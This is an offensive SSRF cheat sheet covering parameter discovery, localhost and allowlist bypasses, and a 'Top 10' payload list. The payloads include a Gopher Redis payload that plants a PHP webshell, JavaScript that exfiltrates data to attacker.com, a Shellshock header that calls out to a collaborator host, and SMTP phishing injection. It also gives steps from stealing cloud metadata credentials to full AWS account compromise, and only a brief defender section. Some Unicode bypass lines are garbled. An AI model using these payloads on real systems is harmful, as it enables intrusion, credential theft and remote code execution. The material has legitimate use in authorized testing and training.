## 🎯 Overview & Theory

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to manipulate a server-side application into making HTTP requests to an arbitrary domain of the attacker's choosing. The attacker can abuse server functionality to read or update internal resources, access services behind firewalls, or interact with internal systems via the vulnerable server.

**Key Characteristics:**

- Exploits server-side request functionality (URL fetching, file imports, webhooks, etc.)
- Can access internal networks, cloud metadata, and localhost services
- Differs from file inclusion: SSRF uses data-handling functions, not code inclusion
- Impact ranges from information disclosure to Remote Code Execution (RCE)

**SSRF Types:**

1. **Basic/Regular SSRF**: Server fetches attacker-specified URL and returns response to attacker
2. **Blind SSRF**: Server makes request but doesn't return response in application frontend

---

## 🔍 Discovery & Reconnaissance

### Where to Look for SSRF

**High-Priority Parameters:**

```
url=, uri=, path=, dest=, redirect=, next=, file=, page=, 
link=, proxy=, fwd=, forward=, data=, reference=, site=, 
return=, returnUrl=, return_url=, ReturnUrl=, go=, goto=, 
continue=, view=, target=, rurl=, u=, load=, read=, 
src=, source=, img=, imageurl=, callback=, domain=, 
jsonp=, api_key=, out=, val=, validate=, feed=, host=, 
port=, to=, window=, show=
```

**Common Attack Surfaces:**

1. **API Endpoints & Webhooks**
    
    - URL parameters in REST APIs
    - Webhook registration/testing features
    - File upload from URL functionality
    - PDF/document generation from HTML
2. **Import/Export Features**
    
    - CSV/XML import from URL
    - Data synchronization endpoints
    - RSS/feed aggregators
    - Remote file inclusion
3. **Hidden Parameters**
    
    ```bash
    # Use parameter discovery tools
    ffuf -w params.txt -u https://target.com/api?FUZZ=http://burpcollaborator.net
    
    # Burp extension: param-miner
    # Tool: Arjun, x8
    ```
    
4. **HTTP Headers**
    
    ```
    Referer: http://burpcollaborator.net
    X-Forwarded-For: http://169.254.169.254
    Client-IP: http://metadata.google.internal
    X-Original-URL: http://localhost/admin
    X-Rewrite-URL: http://127.0.0.1:8080
    ```
    
5. **File Upload Fields**
    
    - Change `type=file` to `type=url` in forms
    - Upload SVG with SSRF payload
    - Video upload (FFmpeg HLS exploits)
6. **Sign-Up/Profile Fields**
    
    - Email: `user@burpcollaborator.net` (check for HTTP/DNS pingback)
    - Avatar URL, profile picture import
    - Website/social media link fields

---

## 🚀 Exploitation Methods

### Step-by-Step Basic Exploitation

**Phase 1: Detection**

1. **Capture Interaction**
    
    ```bash
    # Test with Burp Collaborator, Interactsh, or webhook.site
    url=http://burpcollaborator.net
    url=http://yourdomain.interact.sh
    url=http://webhook.site/unique-id
    ```
    
2. **Verify Server-Side Processing**
    
    - Check for DNS/HTTP requests in collaborator logs
    - Monitor response times (delays indicate request was made)
    - Look for error messages revealing internal IP/port info

**Phase 2: Internal Network Access**

3. **Localhost Enumeration**
    
    ```bash
    # Basic localhost payloads
    http://127.0.0.1:80
    http://localhost:80
    http://0.0.0.0:80
    http://[::]:80
    http://0
    
    # Port scanning
    http://127.0.0.1:22    # SSH
    http://127.0.0.1:3306  # MySQL
    http://127.0.0.1:6379  # Redis
    http://127.0.0.1:5432  # PostgreSQL
    http://127.0.0.1:9200  # Elasticsearch
    ```
    
4. **Internal IP Discovery**
    
    ```bash
    # Common private ranges
    http://192.168.0.1/admin
    http://10.0.0.1:8080
    http://172.16.0.1
    
    # Automated scanning
    ffuf -w internal-ips.txt -u https://target.com/fetch?url=http://FUZZ:80
    ```
    

**Phase 3: Protocol & Scheme Abuse**

5. **File Access (if supported)**
    
    ```bash
    file:///etc/passwd
    file:///c:/windows/win.ini
    file://\/\/etc/passwd  # Bypass URL parser
    ```
    
6. **Gopher Protocol (Universal Exploit)**
    
    ```bash
    # Generate payloads with Gopherus
    gopherus --exploit redis
    gopherus --exploit mysql
    gopherus --exploit fastcgi
    
    # Manual Gopher SMTP example
    gopher://127.0.0.1:25/_HELO%20localhost%0D%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0A
    ```
    
7. **Cloud Metadata Access**
    
    ```bash
    # AWS
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
    
    # GCP (requires header: Metadata-Flavor: Google)
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    
    # Azure (requires header: Metadata: true)
    http://169.254.169.254/metadata/instance?api-version=2021-02-01
    ```
    

---

## 🛡️ Bypass Techniques

### Localhost Filter Bypasses

**IP Representation Tricks:**

```bash
# Decimal/Octal/Hex encoding
http://2130706433/              # 127.0.0.1 in decimal
http://0x7f000001/              # Hexadecimal
http://0177.0000.0000.0001      # Octal
http://0x7f.0x0.0x0.0x1         # Mixed hex

# Short-hand formats
http://127.1                    # = 127.0.0.1
http://127.0.1                  # = 127.0.0.1
http://0                        # = 0.0.0.0

# IPv6 variations
http://[::1]                    # IPv6 localhost
http://[0:0:0:0:0:ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:127.0.0.1]       # Short form
```

**DNS Rebinding & Pinning:**

```bash
# Services that resolve to localhost
http://localtest.me             # = 127.0.0.1
http://127.0.0.1.nip.io         # = 127.0.0.1
http://bugbounty.dod.network    # = 127.0.0.2

# DNS rebinding (1u.ms service)
http://make-127-0-0-1-rr.1u.ms  # Resolves to 127.0.0.1
http://make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms  # First req: 1.1.1.1, Second: 127.0.0.1

# Custom subdomain pointing to internal IP
attacker-internal.yoursite.com  # A record: 192.168.1.1
```

**Enclosed Alphanumerics (Unicode Bypass):**

```bash
http://â' â'¡â'¦.â"ª.â"ª.â' .nip.io   # 127.0.0.1
http://â""â"§â"â"œâ"Ÿâ"›â"".â"'â"žâ"œ         # example.com
```

### Whitelist/Blacklist Bypasses

**URL Parser Confusion:**

```bash
# @ symbol tricks
https://expected-host@evil.com
https://expected-host:fakepass@127.0.0.1
http://google.com@127.0.0.1
http://google.com:80+&@127.0.0.1:22/#@google.com

# Fragment/anchor bypass
https://evil.com#expected-host
https://127.0.0.1#allowed-domain.com

# Subdomain confusion
https://expected-host.evil.com
https://evil.com/expected-host

# Backslash trick (WHATWG vs RFC3986)
https://expected-host\@evil.com
https://google.com\.evil.com
```

**Open Redirect Chaining:**

```bash
# If target whitelists its own domain
https://trusted.com/redirect?url=http://169.254.169.254
https://trusted.com/api/next?path=http://attacker.com

# 301/302 Redirect exploitation
# Create redirect.php:
<?php header('Location: gopher://127.0.0.1:6379/_...'); ?>
# Then: https://target.com/fetch?url=https://attacker.com/redirect.php
```

**Protocol Smuggling:**

```bash
# URL scheme variations
http://127.0.0.1
https://127.0.0.1
file://127.0.0.1
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_SET%20...
sftp://127.0.0.1:22
ldap://127.0.0.1:389/%0astats

# Java-specific (Windows)
l://localhost/c:/windows/win.ini  # Single letter = drive letter

# Combined protocol bypass
url:http://127.0.0.1  # Java accepts this
```

**Filter Evasion Techniques:**

```bash
# URL encoding
http://127.0.0.1/%61dmin         # /admin
http://127.0.0.1/%2561dmin       # Double-encode

# Case variations
http://LocaLhOsT:80

# Rare address formats
http://0/                        # = 0.0.0.0
http://127.000000000000.1        # Padding zeros

# Malformed URLs
localhost:+11211aaa
localhost:00011211aaaa

# Ruby Resolv bug (CVE)
http://0x7f.1  # Returns empty array in Ruby, bypasses IP block
```

### Cloud-Specific Bypasses

**AWS IMDSv2 Bypass (Requires PUT + Headers):**

```bash
# Traditional (IMDSv1 - deprecated)
http://169.254.169.254/latest/meta-data/

# IMDSv2 requirement (harder to exploit via SSRF)
# Step 1: PUT request to get token (hop limit = 1)
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token in header
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**GCP Metadata Bypass (Header Required):**

```bash
# Standard (requires header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/

# Beta endpoint (NO header required - vulnerability)
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

---

## 💣 Modern & Robust Payloads (Top 10)

### 1. Cloud Metadata Exfiltration

```bash
# AWS - Full credential dump
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP - Service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure - Access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/
```

### 2. Gopher Redis RCE

```bash
# Generate with Gopherus
gopherus --exploit redis

# Example payload (URL-encoded Gopher)
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5Bcmd%5D%29%3B%20%3F%3E%0A%0A%0D%0A
```

### 3. DNS Rebinding for CORS/SOP Bypass

```bash
# Setup: Use rebinding service (e.g., 1u.ms, lock.cmpxchg8b.com)
http://make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms

# JS payload on attacker site:
fetch('http://rebind.attacker.com/exploit')
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/exfil?data=' + btoa(data)))
```

### 4. SSRF to XSS (PDF/SVG Rendering)

```bash
# SVG payload (upload or fetch via SSRF)
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" />
  <script>alert(document.domain)</script>
</svg>

# HTML to PDF converter
<iframe src="file:///etc/passwd" width="800" height="600"></iframe>
<img src=x onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
```

### 5. SMTP Gopher Injection

```bash
gopher://127.0.0.1:25/_HELO%20localhost%0D%0A
MAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0A
RCPT%20TO%3A%3Cvictim%40target.com%3E%0D%0A
DATA%0D%0A
Subject%3A%20Phishing%0D%0A
Body%20content%20here%0D%0A
.%0D%0A
QUIT%0D%0A
```

### 6. Time-Based Blind SSRF

```bash
# Use timing to detect open ports
url=http://127.0.0.1:22        # SSH responds quickly
url=http://127.0.0.1:12345     # Closed port times out

# Automate with Intruder + response time analysis
```

### 7. SSRF via Redirect (301/302 Chain)

```bash
# Python server (redirector.py)
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/')
def redir():
    return redirect('gopher://127.0.0.1:6379/_...', code=301)

# Exploit: target.com/fetch?url=http://attacker.com:5000/
```

### 8. Kubernetes/Docker Metadata Access

```bash
# Kubernetes ETCD
http://127.0.0.1:2379/v2/keys/?recursive=true

# Docker API
http://127.0.0.1:2375/v1.24/containers/json

# Docker socket (if accessible)
curl --unix-socket /var/run/docker.sock http://foo/containers/json
```

### 9. SSRF + Command Injection (Shellshock)

```bash
# User-Agent header exploitation
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).burpcollaborator.net

# URL parameter
url=http://collaborator.net?`whoami`
```

### 10. FFmpeg HLS SSRF (Video Upload)

```bash
# AVI file with SSRF payload (use tool: ffmpeg-avi-m3u-xbin)
# Modify HLS playlist to fetch internal resources
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```

---

## 🎯 Higher Impact Scenarios

### SSRF → RCE Escalation Paths

**1. Redis Exploitation**

```bash
# Using Gopherus-generated payload
# Write webshell to web root
gopherus --exploit redis

# Manual steps:
# 1. Set dir to web root
# 2. Set dbfilename to shell.php
# 3. Set payload: <?php system($_GET['cmd']); ?>
# 4. Save
```

**2. FastCGI Exploitation**

```bash
gopherus --exploit fastcgi

# Targets PHP-FPM on port 9000
# Executes arbitrary PHP code
```

**3. Memcached Deserialization**

```bash
gopherus --exploit pymemcache   # Python pickle
gopherus --exploit rbmemcache   # Ruby Marshal
gopherus --exploit phpmemcache  # PHP serialize
```

**4. MySQL/PostgreSQL Command Execution**

```bash
gopherus --exploit mysql
gopherus --exploit postgresql

# Load arbitrary files, enable file writes
```

### AWS Metadata → Full Account Compromise

**Step-by-Step:**

1. **Extract IAM Credentials**
    
    ```bash
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
    # Returns role name, then:
    http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
    ```
    
2. **Configure AWS CLI**
    
    ```bash
    aws configure set aws_access_key_id ASIA...
    aws configure set aws_secret_access_key wJalr...
    aws configure set aws_session_token IQoJb3...
    ```
    
3. **Enumerate Permissions**
    
    ```bash
    aws sts get-caller-identity
    aws iam list-attached-user-policies --user-name [USER]
    aws s3 ls
    ```
    
4. **Lateral Movement**
    
    ```bash
    aws ec2 describe-instances
    aws lambda list-functions
    aws rds describe-db-instances
    ```
    

### Azure Managed Identity Abuse

**Environment Variables (App Services/Functions):**

```bash
# Check for:
$IDENTITY_ENDPOINT
$IDENTITY_HEADER

# Exploit:
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

---

## 🔧 Tools & Automation

**Essential Toolkit:**

1. **SSRFMap** (Python)
    
    ```bash
    git clone https://github.com/swisskyrepo/SSRFmap
    python3 ssrfmap.py -r request.txt -p url -m readfiles
    ```
    
2. **Gopherus** (Gopher Payload Generator)
    
    ```bash
    gopherus --exploit [redis|mysql|fastcgi|postgresql|zabbix|smtp|...]
    ```
    
3. **Interactsh** (Pingback Server)
    
    ```bash
    interactsh-client -v
    # Use generated domain in SSRF tests
    ```
    
4. **Burp Extensions**
    
    - Collaborator Everywhere (auto-inject payloads)
    - Param Miner (hidden parameter discovery)
    - Turbo Intruder (high-speed fuzzing)
5. **SSRFire** (Bash)
    
    ```bash
    ./ssrfire.sh -d target.com -s yourserver.com -f urls.txt
    ```
    
6. **Custom Scripts**
    
    ```bash
    # Parameter fuzzing
    ffuf -w ssrf-params.txt -u https://target.com/api?FUZZ=http://collaborator.net
    
    # Port scanning
    seq 1 65535 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code} - {}\n" \
      "https://target.com/fetch?url=http://127.0.0.1:{}"
    ```
    

---

## 🛠️ Mitigation Strategies (For Defenders)

**Application Layer:**

1. **Input Validation**
    
    - Use allowlists (not blocklists) for domains/IPs
    - Validate URL scheme (http/https only)
    - Parse and validate each URL component separately
2. **Network Segmentation**
    
    - Isolate application servers from internal networks
    - Use firewall rules to block metadata endpoints (169.254.169.254)
    - Implement egress filtering
3. **Disable Unnecessary Protocols**
    
    ```python
    # PHP example
    $allowed_protocols = ['http', 'https'];
    $parsed = parse_url($url);
    if (!in_array($parsed['scheme'], $allowed_protocols)) {
        die('Invalid protocol');
    }
    ```
    
4. **Response Handling**
    
    - Don't return raw responses to users
    - Implement response size limits
    - Strip sensitive headers from proxied responses
5. **Authentication & Authorization**
    
    - Require authentication for URL-fetching features
    - Implement rate limiting
    - Log all outbound requests

**Cloud-Specific:**

- AWS: Enforce IMDSv2, use hop limits
- GCP: Disable legacy metadata endpoints
- Azure: Use managed identities with least privilege

---

## 📚 Practice Labs & Resources

**Hands-On Training:**

- PortSwigger Web Security Academy (SSRF labs)
- HackTheBox: Machines with SSRF (SecNotes, Vault, etc.)
- [SSRF Vulnerable Lab](https://github.com/incredibleindishell/SSRF_Vulnerable_Lab)

**Reference Materials:**

- OWASP SSRF Cheat Sheet
- HackerOne Public Reports (search: SSRF)
- PayloadsAllTheThings (SSRF section)

---

## 🎉 Motivation & Mindset

**Key Takeaways:**

✅ **Start Simple**: Test basic localhost payloads before advanced techniques  
✅ **Be Thorough**: Check ALL parameters, headers, and file upload fields  
✅ **Think Creatively**: Combine SSRF with other vulns (XSS, Open Redirect, Command Injection)  
✅ **Document Everything**: Keep notes on what works and what doesn't

**Remember**: Every closed port teaches you something. Every filtered request brings you closer to the bypass. Keep testing, stay curious, and celebrate small wins! 🚀

---

_This guide consolidates 14 sources into one comprehensive SSRF resource. Use responsibly and ethically._ 🕵️‍♂️